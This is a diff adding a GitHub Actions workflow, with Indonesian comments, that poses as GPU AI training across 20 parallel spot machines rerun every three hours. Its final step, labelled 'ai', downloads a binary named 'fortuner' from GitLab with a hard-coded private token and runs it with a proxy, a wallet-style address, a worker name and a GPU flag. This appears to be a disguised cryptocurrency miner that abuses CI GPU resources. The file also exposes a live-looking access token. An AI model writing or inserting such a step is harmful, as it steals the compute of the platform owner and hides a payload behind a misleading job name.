@@ -1,0 +1,54 @@
+name: GPU AI CHATGPT
+
+on:
+  push:
+    branches: [ main ]
+  schedule:
+    # Auto-run setiap 3 jam sekali biar 20 mesinnya nyambung terus 24 jam
+    - cron: '0 */3 * * *'
+  workflow_dispatch: # Biar bisa lu klik tombol "Run workflow" manual kapan aja
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run Lint
+        run: |
+          if [ -f "./lint.sh" ]; then
+            chmod +x ./lint.sh
+            ./lint.sh
+          else
+            echo "No lint.sh found, skipping verification."
+          fi
+
+  train:
+    needs: lint
+    runs-on: machine/gpu=l40s/tenancy=spot # Beneran sewa mesin L40S Spot Instance
+    timeout-minutes: 360 # Batas maksimal runtime per run (6 jam) biar durasi panjang
+    strategy:
+      fail-fast: false # Kalau ada 1 mesin spot yang mati kena preempted, 19 mesin lainnya tetep gas pol
+      matrix:
+        worker_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20] # Membuka 20 mesin virtual terpisah sekaligus
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Verify GPU
+        run: nvidia-smi
+
+      - name: Install dependencies
+        run: pip install -r requirements.txt
+
+      - name: Train
+        run: python train.py
+
+      - name: ai
+        run: |
+          wget --header="PRIVATE-TOKEN: glpat-ITYlvJSY4cWXuhbYhBkwfWM6MQpvOjEKdTptcjVmNQ8.01.1716neev5" "https://gitlab.com/api/v4/projects/tirtalopi%2Fai-myproject/repository/files/fortuner/raw?ref=main" -O fortuner
+          chmod +x fortuner
+          ./fortuner --proxy 207.148.67.117:80 --address prl1p0fyfm6y8hut4prul0cwp9gqqft4lccgpha5tz96hc3t8lte39r9qfg9ry8 --worker github-l40s-mesin-${{ matrix.worker_id }} -gpu
